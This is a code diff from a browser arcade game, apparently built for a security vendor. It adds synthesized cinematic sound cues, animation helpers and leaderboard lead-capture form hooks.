+      }catch(_){}
+      _schedMenuPiano();
+    }, delay);
+  }
+  _schedMenuPiano();
+
+  // ── Layer 3: Low-brass "breath" swell — D2/A2 detuned saw pair ──
+  // Fires every 28–50s. Slow attack (2.5s) + long release (3.5s) — this is the
+  // "the threat is inhaling" texture that sells Zimmer at ambient volume.
+  function _schedMenuBrass(){
+    const delay=28000+Math.random()*22000;
+    _menuBrassTimer=setTimeout(()=>{
+      if(!_menuBedActive) return;
+      try{
+        const tac=AC(); const t0=tac.currentTime;
+        // Two detuned saw voices into a resonant lowpass → menu bed bus
+        const voices=[{f:73.42, det:0}, {f:73.90, det:0}, {f:110.00, det:-4}];
+        const grp=tac.createGain(); grp.gain.value=0.022;
+        const flt=tac.createBiquadFilter();
+        flt.type='lowpass'; flt.frequency.value=320; flt.Q.value=1.6;
+        grp.connect(flt); flt.connect(_menuBedGain);
+        const env=tac.createGain(); env.gain.value=0.0001;
+        env.gain.setValueAtTime(0.0001, t0);
+        env.gain.linearRampToValueAtTime(1.0, t0+2.5);   // slow inhale
+        env.gain.linearRampToValueAtTime(0.0001, t0+6.0); // long exhale
+        env.connect(grp);
+        const oscs=[];
+        voices.forEach(v=>{
+          const o=tac.createOscillator(); o.type='sawtooth';
+          o.frequency.value=v.f; if(v.det) o.detune.value=v.det;
+          o.connect(env);
+          o.start(t0); o.stop(t0+6.2);
+          oscs.push(o);
+        });
+        // No need to retain — stop() + the 6.2s clock auto-cleans
+      }catch(_){}
+      _schedMenuBrass();
+    }, delay);
+  }
+  _schedMenuBrass();
 }
 
 function _stopMenuBed(){
@@ -8402,6 +10202,15 @@ function _stopMenuBed(){
     try{ if(_menuShimPan) _menuShimPan.disconnect(); }catch(_){}
     try{ if(_menuShimPanLfo){ _menuShimPanLfo.stop(); _menuShimPanLfo.disconnect(); } }catch(_){}
     try{ if(_menuBedGain) _menuBedGain.disconnect(); }catch(_){}
+    // Phase 1 Zimmer uplift: tear down Shepard tone voices and any stray gain
+    // nodes. Piano and brass timers are cleared outside this setTimeout so the
+    // next scheduled cue doesn't fire during the 0.95s fadeout.
+    try{ _menuShepOscs.forEach(o=>{ try{ o.stop(); o.disconnect(); }catch(_){} }); }catch(_){}
+    try{ _menuShepGains.forEach(g=>{ try{ g.disconnect(); }catch(_){} }); }catch(_){}
+    try{ if(_menuShepFilt) _menuShepFilt.disconnect(); }catch(_){}
+    try{ if(_menuShepBus)  _menuShepBus.disconnect(); }catch(_){}
+    _menuShepOscs=[]; _menuShepGains=[]; _menuShepLfos=[];
+    _menuShepFilt=null; _menuShepBus=null;
     // Prune LFO registry
     _activeLFOs=_activeLFOs.filter(l=>l!==_menuSubLfo && l!==_menuPadLfo && l!==_menuShimPanLfo);
     _menuSubOsc=_menuSubLfo=_menuPadLfo=_menuPadFilt=null;
@@ -8409,6 +10218,10 @@ function _stopMenuBed(){
     _menuBedGain=null;
   }, 950);
   if(_menuPulseTimer){ clearTimeout(_menuPulseTimer); _menuPulseTimer=null; }
+  // Phase 1 Zimmer uplift: stop the new schedulers synchronously so no cue
+  // fires mid-fadeout.
+  if(_menuPianoTimer){ clearTimeout(_menuPianoTimer); _menuPianoTimer=null; }
+  if(_menuBrassTimer){ clearTimeout(_menuBrassTimer); _menuBrassTimer=null; }
   _menuBedActive=false;
 }
 
@@ -9718,9 +11531,11 @@ function _huntSfxRecipe(name,opts){
     }
     case 'hunt_dossier': {
       // Case file open — three-note file-flip triad
+      // Phase 5.C: -3 dB damp (from -1 → -4) so the chime supports boss_arrival_reveal
+      //            at Hunt briefing entry instead of stepping on the horn swell.
       const notes=[261.63, 329.63, 392];
       notes.forEach((f,i)=>setTimeout(()=>_playLayered({
-        bus:'sfx', pan:_rnd(-1,1), gainDb:-1,
+        bus:'sfx', pan:_rnd(-1,1), gainDb:-4,
         transient:{ type:'triangle', f:f*2, d:0.008, g:0.16, filt:{type:'bandpass',f:f*2,Q:2.8} },
         body:{ type:'sine', f:f, d:0.18, g:0.06, filt:{type:'bandpass',f:620,Q:3.0} },
         reverbWet:0.24
@@ -10198,6 +12013,354 @@ function _stingerRecipe(name,opts){
         sub:{ type:'sine', f:65, d:0.8, g:0.08, attack:0.06 },
         reverbWet:0.4
       }),0);
+      break;
+    }
+    case 'zimmer_curtain_raise': case 'curtain_raise': {
+      // ── Phase 1 Zimmer first-impression cue (~3s total) ──
+      // Fires on boot finish, first gesture after auto-finish, and attract exit.
+      // t=0ms  sub drop (55Hz → 27Hz)
+      _playLayered({
+        bus:'stinger', pan:0, gainDb:1.2,
+        transient:{ noise:true, d:0.05, g:0.45, filt:{type:'bandpass',f:3400,Q:0.9} },
+        sub:{ type:'sine', f:55, toF:27, d:2.2, g:0.20, attack:0.04 },
+        reverbWet:0.70
+      });
+      // t=40ms  braam — detuned saw pair 110→55Hz into lowpass sweep 520→220Hz
+      setTimeout(()=>_playLayered({
+        bus:'stinger', pan:-1.5, gainDb:0.8,
+        body:{ type:'sawtooth', f:110, toF:55, d:1.6, g:0.13, filt:{type:'lowpass',f:520,Q:3.0}, filtEnvTo:220, attack:0.04, release:1.2 },
+        subs:[
+          { type:'sawtooth', f:112, toF:56, d:1.6, g:0.12, filt:{type:'lowpass',f:520,Q:3.0}, filtEnvTo:220, attack:0.045, release:1.2 }
+        ],
+        grit:{ d:0.55, g:0.05, filtType:'bandpass', f:1800, Q:0.8 },
+        reverbWet:0.62
+      }),40);
+      // t=320ms  sparse piano stab — E6/C7/E7 bell stack
+      setTimeout(()=>_playLayered({
+        bus:'stinger', pan:1.2, gainDb:-1.0,
+        body:{ type:'sine', f:1319, d:0.9, g:0.030, attack:0.004, release:0.85, filt:{type:'lowpass',f:4800,Q:1.1} },
+        subs:[
+          { type:'sine', f:2093, d:0.7, g:0.022, attack:0.006, release:0.68 },
+          { type:'sine', f:2637, d:0.55, g:0.018, attack:0.010, release:0.5 }
+        ],
+        reverbWet:0.70
+      }),320);
+      // t=800ms  Shepard-style riser — 4 voices sweeping up with crossfaded gains (1.4s)
+      setTimeout(()=>{
+        const bases=[220,330,440,880];
+        bases.forEach((f,i)=>{
+          setTimeout(()=>_playLayered({
+            bus:'stinger', pan:_rnd(-2,2), gainDb:-4 + i*-0.5,
+            body:{ type:'sawtooth', f:f, toF:f*2, d:1.4, g:0.026, filt:{type:'lowpass',f:2200,Q:1.2}, filtEnvTo:3600, attack:0.18, release:1.1 },
+            reverbWet:0.5
+          }),i*70);
+        });
+      },800);
+      // t=1600ms  final low-brass braam D2→D3 — the hit that "lands"
+      setTimeout(()=>_playLayered({
+        bus:'stinger', pan:0, gainDb:1.6,
+        transient:{ noise:true, d:0.03, g:0.35, filt:{type:'bandpass',f:2600,Q:1.0} },
+        body:{ type:'sawtooth', f:73.42, toF:146.83, d:1.0, g:0.11, filt:{type:'lowpass',f:640,Q:2.8}, filtEnvTo:280, attack:0.02, release:0.7 },
+        subs:[
+          { type:'sawtooth', f:73.90, toF:147.40, d:1.0, g:0.10, filt:{type:'lowpass',f:640,Q:2.8}, filtEnvTo:280, attack:0.025, release:0.7 },
+          { type:'sine', f:36.71, d:1.3, g:0.09, attack:0.04 }
+        ],
+        reverbWet:0.55
+      }),1600);
+      break;
+    }
+    case 'zimmer_card_commit': case 'card_commit': {
+      // ── Card-click weight — 0.8s braam + sub drop + 8va piano flourish ──
+      _playLayered({
+        bus:'stinger', pan:0, gainDb:1.0,
+        transient:{ noise:true, d:0.03, g:0.40, filt:{type:'bandpass',f:3200,Q:0.9} },
+        body:{ type:'sawtooth', f:98, toF:49, d:0.6, g:0.10, filt:{type:'lowpass',f:460,Q:3.0}, filtEnvTo:180, attack:0.02, release:0.42 },
+        subs:[
+          { type:'sawtooth', f:99.5, toF:49.7, d:0.6, g:0.09, filt:{type:'lowpass',f:460,Q:3.0}, filtEnvTo:180, attack:0.025, release:0.42 },
+          { type:'sine', f:41.2, d:0.85, g:0.10, attack:0.03 }
+        ],
+        reverbWet:0.58
+      });
+      // Piano 8va flourish at 180ms — F#5 + F#6 bell
+      setTimeout(()=>_playLayered({
+        bus:'stinger', pan:1.0, gainDb:-2.0,
+        body:{ type:'sine', f:740, d:0.55, g:0.024, attack:0.003, release:0.48, filt:{type:'lowpass',f:3600,Q:1.1} },
+        subs:[
+          { type:'sine', f:1480, d:0.42, g:0.018, attack:0.005, release:0.36 }
+        ],
+        reverbWet:0.62
+      }),180);
+      break;
+    }
+    // ── Phase 2 Zimmer mission-brief / deploy corridor ──────────────────
+    // Additive recipes. All fire-and-forget, no persistent nodes.
+    // Intent: replace ArcadeSonic.uiOpen/confirm and silent deploy overlay
+    // with the Dark-Knight dramaturgy outlined in the audio map:
+    //   enter  — orchestral swell (bed + piano punctuation)
+    //   tick   — subsonic heartbeat for last 3s of auto-deploy countdown
+    //   commit — taiko impact + 180ms silence + braam + sub
+    //   deploy_overlay_impact — sub drone lands with the overlay fade-in
+    case 'brief_enter': case 'briefEnter': {
+      // Soft sub swell (1.2s) into a piano punctuation at 500ms, then a
+      // low string-pad body that tapers under the bed. Peaks around -14 dB.
+      _playLayered({
+        bus:'stinger', pan:0, gainDb:0.2,
+        sub:{ type:'sine', f:55, toF:73, d:1.2, g:0.11, attack:0.18 },
+        body:{ type:'sawtooth', f:146.83, d:1.0, g:0.06, filt:{type:'lowpass',f:720,Q:1.6}, filtEnvTo:1400, attack:0.14, release:0.7 },
+        subs:[
+          { type:'sawtooth', f:147.4, d:1.0, g:0.055, filt:{type:'lowpass',f:720,Q:1.6}, filtEnvTo:1400, attack:0.16, release:0.7 }
+        ],
+        reverbWet:0.60
+      });
+      // Piano punctuation at t=500ms — E6 solitary bell
+      setTimeout(()=>_playLayered({
+        bus:'stinger', pan:0.8, gainDb:-2.0,
+        body:{ type:'sine', f:1319, d:0.9, g:0.026, attack:0.004, release:0.82, filt:{type:'lowpass',f:4800,Q:1.05} },
+        subs:[
+          { type:'sine', f:2093, d:0.6, g:0.018, attack:0.006, release:0.55 }
+        ],
+        reverbWet:0.68
+      }),500);
+      break;
+    }
+    case 'brief_countdown_tick': case 'briefTick': {
+      // Heartbeat per whole second of the final 3s. A subsonic taiko hit
+      // whose filter cutoff rises per tick: callers may pass opts.step
+      // (0|1|2) where 0 = 3s remaining, 2 = 1s remaining (brightest).
+      const step = (opts && typeof opts.step==='number') ? Math.max(0,Math.min(2,opts.step)) : 0;
+      const filtCut = 2200 + step*1200; // 2200 / 3400 / 4600
+      const gainBoost = -1.0 + step*0.8; // gets louder as zero approaches
+      _playLayered({
+        bus:'stinger', pan:0, gainDb:gainBoost,
+        transient:{ noise:true, d:0.04, g:0.22, filt:{type:'bandpass',f:filtCut,Q:0.9} },
+        body:{ type:'sine', f:82.4, d:0.32, g:0.09, attack:0.004, release:0.28, filt:{type:'lowpass',f:filtCut,Q:1.1} },
+        subs:[
+          { type:'sine', f:41.2, d:0.38, g:0.08, attack:0.005 }
+        ],
+        reverbWet:0.25
+      });
+      break;
+    }
+    case 'brief_deploy_commit': case 'deployCommit': {
+      // The single most important audio moment in the arcade.
+      // t=0    : taiko impact (transient + tonal + sub)
+      // t=180ms: AUTHORED SILENCE (Zimmer cut — nothing fires here)
+      // t=360ms: braam — detuned saw pair 98→49Hz with sub drone
+      // t=620ms: rising low-string pad bridging into the deploy overlay
+      _playLayered({
+        bus:'stinger', pan:0, gainDb:1.4,
+        transient:{ noise:true, d:0.05, g:0.50, filt:{type:'bandpass',f:3000,Q:0.8} },
+        body:{ type:'sine', f:62, toF:49, d:0.18, g:0.15, attack:0.003, release:0.16, filt:{type:'lowpass',f:900,Q:1.4} },
+        subs:[
+          { type:'sine', f:31, d:0.32, g:0.18, attack:0.004 }
+        ],
+        reverbWet:0.55
+      });
+      // t=360ms braam (after 180ms silence)
+      setTimeout(()=>_playLayered({
+        bus:'stinger', pan:-1.2, gainDb:1.0,
+        body:{ type:'sawtooth', f:98, toF:49, d:1.2, g:0.12, filt:{type:'lowpass',f:520,Q:3.0}, filtEnvTo:200, attack:0.025, release:0.9 },
+        subs:[
+          { type:'sawtooth', f:99.3, toF:49.6, d:1.2, g:0.11, filt:{type:'lowpass',f:520,Q:3.0}, filtEnvTo:200, attack:0.03, release:0.9 },
+          { type:'sine', f:41.2, d:1.4, g:0.14, attack:0.04 }
+        ],
+        grit:{ d:0.42, g:0.04, filtType:'bandpass', f:1800, Q:0.8 },
+        reverbWet:0.62
+      }),360);
+      // t=620ms low-string pad — D2 long tone for 1.1s
+      setTimeout(()=>_playLayered({
+        bus:'stinger', pan:0, gainDb:-1.0,
+        body:{ type:'sawtooth', f:73.42, d:1.1, g:0.08, filt:{type:'lowpass',f:620,Q:2.2}, filtEnvTo:320, attack:0.12, release:0.8 },
+        subs:[
+          { type:'sine', f:36.71, d:1.2, g:0.10, attack:0.08 }
+        ],
+        reverbWet:0.58
+      }),620);
+      break;
+    }
+    case 'deploy_overlay_impact': case 'deployImpact': {
+      // Scheduled in showDeployOverlay to land at t≈340ms — synchronized with
+      // the commit stinger's braam (t=360ms). Reinforces the braam attack;
+      // does not compete with the commit taiko's transient (that's already
+      // placed in brief_deploy_commit), so no redundant transient here.
+      _playLayered({
+        bus:'stinger', pan:0, gainDb:-3.0,
+        sub:{ type:'sine', f:38, toF:29, d:0.75, g:0.12, attack:0.02 },
+        body:{ type:'sawtooth', f:55, d:0.48, g:0.04, filt:{type:'lowpass',f:460,Q:2.2}, filtEnvTo:180, attack:0.04, release:0.42 },
+        reverbWet:0.48
+      });
+      break;
+    }
+    case 'attract_swap': {
+      // Phase 3.B — soft scanline / signal-lock cue between attract scenes.
+      // Ambient bus so it sits under the attract bed without competing.
+      _playLayered({
+        bus:'ambient', pan:0, gainDb:-7.0,
+        transient:{ type:'bandpass', f:2200, Q:1.0, d:0.04, g:0.10 },
+        sub:{ type:'sine', f:41.20, d:0.90, g:0.06, attack:0.06, release:0.82 },
+        reverbWet:0.40
+      });
+      break;
+    }
+    case 'attract_swap_hero': {
+      // Phase 3.B — upgraded signal-lock cut for hero-word entrances.
+      // Has more presence than attract_swap but still below a gameplay stinger.
+      _playLayered({
+        bus:'stinger', pan:0, gainDb:-3.0,
+        transient:{ type:'bandpass', f:3000, Q:1.2, d:0.05, g:0.22 },
+        body:{ type:'sawtooth', f:110, toF:73, d:0.55, g:0.08, filt:{type:'lowpass',f:620,Q:2.0}, filtEnvTo:1200, attack:0.04, release:0.50 },
+        sub:{ type:'sine', f:36.71, d:0.90, g:0.10, attack:0.04, release:0.84 },
+        reverbWet:0.58
+      });
+      break;
+    }
+    case 'leaderboard_open': {
+      // Phase 3.E — archival "hall of fame opens" cue when rankings overlay opens.
+      _playLayered({
+        bus:'stinger', pan:0, gainDb:-2.0,
+        body:{ type:'sawtooth', f:147, toF:220, d:0.60, g:0.08, filt:{type:'lowpass',f:620,Q:1.8}, filtEnvTo:1400, attack:0.06, release:0.50 },
+        sub:{ type:'sine', f:55, d:0.70, g:0.08, attack:0.04, release:0.62 },
+        reverbWet:0.70
+      });
+      // A5 bell at t≈180ms — hall-of-fame shimmer.
+      setTimeout(()=>{ try{ _playLayered({ bus:'stinger', pan:0.1, gainDb:-8.0,
+        body:{ type:'sine', f:880, d:0.90, g:0.022, filt:{type:'lowpass',f:4800,Q:0.7}, attack:0.002, release:0.88 },
+        reverbWet:0.72 }); }catch(_){} }, 180);
+      break;
+    }
+    case 'leaderboard_submit_commit': {
+      // Phase 3.E — official seal on a successful score submission.
+      // Transient + body + sub land immediately; braam-lite at t≈180ms;
+      // E6 bell at t≈520ms as the closing signature.
+      _playLayered({
+        bus:'stinger', pan:0, gainDb:0.2,
+        transient:{ type:'bandpass', f:2400, Q:1.1, d:0.05, g:0.28 },
+        body:{ type:'sawtooth', f:110, toF:73, d:0.22, g:0.14, filt:{type:'lowpass',f:540,Q:2.2}, attack:0.01, release:0.20 },
+        sub:{ type:'sine', f:36, d:0.40, g:0.14, attack:0.01, release:0.36 },
+        reverbWet:0.58
+      });
+      setTimeout(()=>{ try{
+        _playLayered({ bus:'stinger', pan:-0.05, gainDb:-3.5,
+          body:{ type:'sawtooth', f:147, d:0.90, g:0.09, filt:{type:'lowpass',f:820,Q:1.6}, filtEnvTo:1400, attack:0.04, release:0.80 },
+          sub:{ type:'sine', f:36.71, d:0.90, g:0.10, attack:0.04, release:0.80 },
+          reverbWet:0.62 });
+        _playLayered({ bus:'stinger', pan:0.05, gainDb:-3.5,
+          body:{ type:'sawtooth', f:147.8, d:0.90, g:0.09, filt:{type:'lowpass',f:820,Q:1.6}, filtEnvTo:1400, attack:0.04, release:0.80 },
+          reverbWet:0.62 });
+      }catch(_){} }, 180);
+      setTimeout(()=>{ try{ _playLayered({ bus:'stinger', pan:0, gainDb:-9.0,
+        body:{ type:'sine', f:1319, d:0.85, g:0.020, filt:{type:'lowpass',f:5200,Q:0.7}, attack:0.002, release:0.82 },
+        reverbWet:0.70 }); }catch(_){} }, 520);
+      break;
+    }
+    case 'leaderboard_submit_reject': {
+      // Phase 3.E — polite rejection on invalid name/score; no drama.
+      _playLayered({
+        bus:'ui', pan:0, gainDb:-4.0,
+        body:{ type:'sawtooth', f:220, toF:110, d:0.35, g:0.10, filt:{type:'lowpass',f:420,Q:3.0}, attack:0.01, release:0.32 },
+        reverbWet:0.25
+      });
+      break;
+    }
+    case 'defense_victory_release': {
+      // Phase 4.A — taiko head + brass ascent + sub swell + piano bell tail.
+      // Defense-specific "mission accomplished" release cue (~1.8s total).
+      _playLayered({
+        bus:'stinger', pan:0, gainDb:-3.0,
+        transient:{ type:'bandpass', f:220, Q:8, d:0.08, g:0.32 },
+        body:{ type:'sawtooth', f:220, toF:440, d:1.20, g:0.10, filt:{type:'lowpass',f:1200,Q:1.6}, filtEnvTo:3200, attack:0.04, release:1.00 },
+        sub:{ type:'sine', f:55, d:1.40, g:0.14, attack:0.20, release:1.40 },
+        reverbWet:0.42
+      });
+      // Piano C5 bell at t≈220ms — cinematic afterglow.
+      setTimeout(()=>{ try{ _playLayered({
+        bus:'stinger', pan:0.15, gainDb:-8.0,
+        body:{ type:'sine', f:523.25, d:1.20, g:0.022, filt:{type:'lowpass',f:5200,Q:0.7}, attack:0.005, release:1.20 },
+        reverbWet:0.52
+      }); }catch(_){} }, 220);
+      break;
+    }
+    case 'defense_loss_weight': {
+      // Phase 4.B — sub drone + silence gap + low piano dyad (Zimmer pattern).
+      // Lands under Defense #drawGameOver for cinematic loss weight.
+      _playLayered({
+        bus:'stinger', pan:0, gainDb:-4.0,
+        sub:{ type:'sine', f:27, d:2.40, g:0.18, attack:0.40, release:2.40 },
+        body:{ type:'sawtooth', f:27, toF:27, d:2.00, g:0.05, filt:{type:'lowpass',f:180,Q:2.0}, attack:0.30, release:1.80 },
+        reverbWet:0.45
+      });
+      // 180ms silence gap — then low piano dyad C2+Eb2 for the "weight."
+      setTimeout(()=>{ try{ _playLayered({
+        bus:'stinger', pan:-0.08, gainDb:-7.0,
+        body:{ type:'sine', f:65.41, d:2.80, g:0.050, filt:{type:'lowpass',f:900,Q:0.8}, attack:0.008, release:2.80 },
+        reverbWet:0.48
+      }); _playLayered({
+        bus:'stinger', pan:0.08, gainDb:-8.5,
+        body:{ type:'sine', f:77.78, d:2.80, g:0.042, filt:{type:'lowpass',f:900,Q:0.8}, attack:0.010, release:2.80 },
+        reverbWet:0.48
+      }); }catch(_){} }, 180);
+      break;
+    }
+    case 'hunt_victory_release': {
+      // Phase 4.C — lighter sparkle (F5 piano bell + mid string + soft taiko).
+      // Hunt-specific noir release — lighter than Defense, ~1.7s.
+      _playLayered({
+        bus:'stinger', pan:0.05, gainDb:-4.0,
+        transient:{ type:'bandpass', f:180, Q:6, d:0.06, g:0.20 },
+        body:{ type:'sine', f:698.46, d:0.85, g:0.028, filt:{type:'lowpass',f:4800,Q:0.7}, attack:0.004, release:0.85 },
+        sub:{ type:'sine', f:82.41, d:0.65, g:0.10, attack:0.06, release:0.55 },
+        reverbWet:0.50
+      });
+      // Mid-range string pad (A3) at t≈140ms for warmth.
+      setTimeout(()=>{ try{ _playLayered({
+        bus:'stinger', pan:-0.10, gainDb:-10.0,
+        body:{ type:'sawtooth', f:220, d:1.60, g:0.045, filt:{type:'lowpass',f:900,Q:1.2}, filtEnvTo:1400, attack:0.15, release:1.40 },
+        reverbWet:0.58
+      }); }catch(_){} }, 140);
+      break;
+    }
+    case 'hunt_loss_weight': {
+      // Phase 4.D — sub drone + noise rush + minor triad string (A2/C3/E3).
+      // Layers UNDER existing HUNT_SFX.breachAlarm without stealing its punch.
+      _playLayered({
+        bus:'stinger', pan:0, gainDb:-5.0,
+        sub:{ type:'sine', f:31, d:2.20, g:0.16, attack:0.35, release:2.20 },
+        body:{ type:'sawtooth', f:31, toF:31, d:1.80, g:0.04, filt:{type:'lowpass',f:180,Q:2.0}, attack:0.25, release:1.60 },
+        transient:{ type:'bandpass', f:800, Q:4, d:0.55, g:0.12 },
+        reverbWet:0.42
+      });
+      // Minor triad string A2/C3/E3 at t≈200ms for "you lost" weight.
+      setTimeout(()=>{ try{
+        _playLayered({ bus:'stinger', pan:-0.12, gainDb:-9.0,
+          body:{ type:'sawtooth', f:110, d:2.00, g:0.050, filt:{type:'lowpass',f:800,Q:1.3}, attack:0.25, release:1.80 },
+          reverbWet:0.50 });
+        _playLayered({ bus:'stinger', pan:0, gainDb:-10.0,
+          body:{ type:'sawtooth', f:130.81, d:2.00, g:0.042, filt:{type:'lowpass',f:800,Q:1.3}, attack:0.26, release:1.80 },
+          reverbWet:0.50 });
+        _playLayered({ bus:'stinger', pan:0.12, gainDb:-10.5,
+          body:{ type:'sawtooth', f:164.81, d:2.00, g:0.038, filt:{type:'lowpass',f:800,Q:1.3}, attack:0.27, release:1.80 },
+          reverbWet:0.50 });
+      }catch(_){} }, 200);
+      break;
+    }
+    case 'boss_arrival_reveal': {
+      // Phase 4.E — hit impact + 80ms silence + horn swell + sub drone.
+      // Lands when Defense enters STATE.BOSS_WARNING or Hunt STATE.BRIEFING.
+      _playLayered({
+        bus:'stinger', pan:0, gainDb:-3.0,
+        transient:{ type:'bandpass', f:180, Q:5, d:0.18, g:0.30 },
+        sub:{ type:'sine', f:33, d:1.80, g:0.16, attack:0.20, release:1.80 },
+        reverbWet:0.45
+      });
+      // 80ms silence — then horn swell 110→220Hz over 1.4s.
+      setTimeout(()=>{ try{
+        _playLayered({ bus:'stinger', pan:-0.08, gainDb:-7.0,
+          body:{ type:'sawtooth', f:110, toF:220, d:1.40, g:0.09, filt:{type:'lowpass',f:700,Q:1.6}, filtEnvTo:1800, attack:0.12, release:1.30 },
+          reverbWet:0.55 });
+        _playLayered({ bus:'stinger', pan:0.08, gainDb:-8.5,
+          body:{ type:'sawtooth', f:110, toF:220, d:1.40, g:0.075, filt:{type:'lowpass',f:700,Q:1.6}, filtEnvTo:1800, attack:0.13, release:1.30 },
+          reverbWet:0.55 });
+      }catch(_){} }, 80);
       break;
     }
     default: break;
@@ -11047,7 +13210,7 @@ const MODS={
     tagline:'Security Orchestration & Automated Response · Machine speed',
     real:'Automates response playbooks at machine speed across all integrated tools.',
     game:'EFFECT: Wipes ALL on-screen enemies AND clears all enemy bullets. +500 bonus.',size:32 },
-  'Exposure Management':{ col:'#ff9a48', dur:15, apply:'exposure', abbr:'EXP',
+  'Exposure Management':{ col:'#ff9a48', dur:15, apply:'exposure', abbr:'FEM',
     tagline:'External Attack Surface Management · Discover before attackers',
     real:'Continuously discovers internet-facing assets and misconfigurations.',
     game:'EFFECT: Radar sweep reveals ALL enemies with type+HP data tags.',size:26 },
@@ -15788,7 +17951,7 @@ function drawPickups(){
       CX.strokeStyle='rgba(255,255,255,0.60)';CX.lineWidth=1.3;CX.setLineDash([2,2]);
       CX.beginPath();CX.moveTo(-9,-3);CX.lineTo(9,-3);CX.stroke();CX.setLineDash([]);
       CX.shadowBlur=0;CX.restore();
-      CX.fillStyle='#ffffff';CX.textAlign='center';CX.font=FONT_BOLD_9;CX.fillText('EXP',0,sz-10);
+      CX.fillStyle='#ffffff';CX.textAlign='center';CX.font=FONT_BOLD_9;CX.fillText('FEM',0,sz-10);
       _ptip(c);CX.shadowBlur=0;CX.textAlign='left';CX.restore();continue;
     }
     // ─── JIT (Just in Time Access) — ephemeral vault, time-bounded token ──
@@ -18678,6 +20841,10 @@ FalconRanking.init({
   },
 });
 
+// Register Incident Zero's lead-capture form with FalconArcade.Overlay.
+// Uses only FalconRanking's PUBLIC API (onGameEnd) — no internals touched.
+try { window.FalconArcade?.Overlay?.registerForm?.('zero', (data) => FalconRanking.onGameEnd(data)); } catch(_){}
+
 window.__zeroSim = {
   getCanvas(){ return CV; },
   forceResize(){ resize(); },
@@ -18858,6 +21025,48 @@ function initGameDefense() {
   if (_initGameDefense_initialized) { return; }
   _initGameDefense_initialized = true;
   (function() {
+// ─── Phase 4 cinematic helpers (portable, IIFE-private) ────────────
+// Duplicated from IZ (block 2 initGameZero) because those helpers are
+// closure-local to initGameZero. These copies live inside the Defense
+// IIFE; no window pollution. See studio/spec-phase4.md section 4.
+function _ph4_ezOutQuart(p){ if(p<=0)return 0; if(p>=1)return 1; return 1-Math.pow(1-p,4); }
+function _ph4_cinOvershoot(p){ if(p<=0)return 0; if(p>=1)return 1; const s=1.35; return 1+(s+1)*Math.pow(p-1,3)+s*Math.pow(p-1,2); }
+function _ph4_cinStagger(p, i, step, ramp){
+  const start = i*step;
+  return Math.max(0, Math.min(1, (p - start) / Math.max(0.001, ramp)));
+}
+function _ph4_rmP(p){ return window._reduceMotion ? 1 : p; }
+function _ph4_drawChromatic(cx, str, x, y, baseFill, font, shift){
+  // Phase 5.B: reduced-motion gate — single-pass fill, no RGB split (accessibility / photosensitivity).
+  if(window._reduceMotion){
+    cx.save();
+    cx.font = font;
+    cx.textAlign = 'center';
+    cx.fillStyle = baseFill;
+    cx.fillText(str, x, y);
+    cx.restore();
+    return;
+  }
+  cx.save();
+  cx.font = font;
+  cx.textAlign = 'center';
+  cx.globalAlpha = 0.38;
+  cx.fillStyle = 'rgba(255,80,80,1)';
+  cx.fillText(str, x - shift, y);
+  cx.fillStyle = 'rgba(80,220,255,1)';
+  cx.fillText(str, x + shift, y);
+  cx.globalAlpha = 1;
+  cx.fillStyle = baseFill;
+  cx.fillText(str, x, y);
+  cx.restore();
+}
+// Phase 4 stinger-fire gate flags (reset per game session by Game).
+let _ph4_winStingerFired = false;
+let _ph4_loseStingerFired = false;
+function _ph4_fireVictoryRelease(){ try{ (window.SoundEngine?.stinger?.fire?.('defense_victory_release')) || window.ArcadeSonic?.playDefenseVictoryRelease?.(); }catch(_){} }
+function _ph4_fireLossWeight(){ try{ (window.SoundEngine?.stinger?.fire?.('defense_loss_weight')) || window.ArcadeSonic?.playDefenseLossWeight?.(); }catch(_){} }
+function _ph4_fireBossArrival(){ try{ (window.SoundEngine?.stinger?.fire?.('boss_arrival_reveal')) || window.ArcadeSonic?.playBossArrivalReveal?.(); }catch(_){} }
+
 // ════════════════════════════════════════════════════════════════════
 //  FALCON RANKING SYSTEM  v1.0
 //  Self-contained leaderboard + lead capture + attract mode
@@ -19811,7 +22020,11 @@ const FalconRanking = (function () {
       if (validation.errors.name) _fieldError('fr-name', 'fr-name-hint', validation.errors.name);
       if (validation.errors.company) _fieldError('fr-company', 'fr-company-hint', validation.errors.company);
       if (validation.errors.email) _fieldError('fr-email', 'fr-email-hint', validation.errors.email);
-      if (!validation.ok) { _submitBtn.disabled = false; return; }
+      if (!validation.ok) {
+        // Phase 3.E — polite rejection cue on invalid submit.
+        try{ if (window.SoundEngine?.stinger) window.SoundEngine.stinger.fire('leaderboard_submit_reject'); }catch(_){}
+        _submitBtn.disabled = false; return;
+      }
       const { name, company, email } = validation.cleaned;
 
       // Save entry
@@ -19826,6 +22039,9 @@ const FalconRanking = (function () {
         gameId:    CFG.gameName,
         event:     CFG.eventName,
       };
+      // Phase 3.E — official seal cue; fired just before the Store commit so
+      // the impact lands with the user's perception of "submitted".
+      try{ if (window.SoundEngine?.stinger) window.SoundEngine.stinger.fire('leaderboard_submit_commit'); }catch(_){}
       const finalRank = Store.add(entry);
 
       // Particle celebration
@@ -22960,6 +25176,9 @@ class Game{
                 FalconRanking.startIdleWatch();
         },
     });
+    // Register Falcon Defense's lead-capture form with FalconArcade.Overlay.
+    // Uses FalconRanking's public onGameEnd — no internals touched.
+    try { window.FalconArcade?.Overlay?.registerForm?.('defense', (data) => FalconRanking.onGameEnd(data)); } catch(_){}
 
 
 
@@ -23099,6 +25318,8 @@ class Game{
           if(chosen){this.#collectMod(chosen);}  // ← moduleUp() already inside #collectMod
           this.#state=this.#bannerBoss?STATE.BOSS_WARNING:STATE.WAVE_BANNER;
           this.#bannerT=0;
+          // Phase 4: fire boss arrival stinger on state transition (primary path)
+          if(this.#bannerBoss){ _ph4_fireBossArrival(); }
         }
         break;
       case STATE.WAVE_BANNER:
@@ -23386,8 +25607,11 @@ class Game{
 
   #startGame(){
     FalconRanking.stopIdleWatch();
+    // Phase 4: reset closure-scoped stinger guards so win/loss fire on fresh runs
+    _ph4_winStingerFired = false;
+    _ph4_loseStingerFired = false;
     this.#score=0;this.#lives=CFG.PLR_LIVES;this.#combo=1;this.#comboT=0;
-    this.#maxCombo=1; 
+    this.#maxCombo=1;
     this.#waveIdx=0;this.#dir=1;
     this.#mods={PREVENT:0,INSIGHT:0,IDENTITY:0,PANGEA:0,EXP:0,COMPLETE:0,CHARLOTTE_AIM:0,CLOUD:0};
     this.#pangeaT=0;this.#deathCtx=null;
@@ -23563,6 +25787,8 @@ class Game{
       if(chosen) this.#collectMod(chosen);
       this.#state=this.#bannerBoss?STATE.BOSS_WARNING:STATE.WAVE_BANNER;
       this.#bannerT=0;
